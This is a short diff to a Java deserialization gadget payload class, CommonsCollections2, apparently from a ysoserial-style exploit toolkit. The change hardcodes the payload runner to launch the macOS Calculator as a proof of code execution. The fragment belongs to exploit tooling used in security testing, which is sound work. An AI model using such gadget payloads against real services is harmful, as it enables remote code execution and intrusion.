@@ -51,8 +51,11 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 		return queue;
 	}
 
+
+
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections2.class, args);
+		//PayloadRunner.run(CommonsCollections2.class, args);
+		PayloadRunner.run(CommonsCollections2.class, new String[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"});
 	}
 
 }
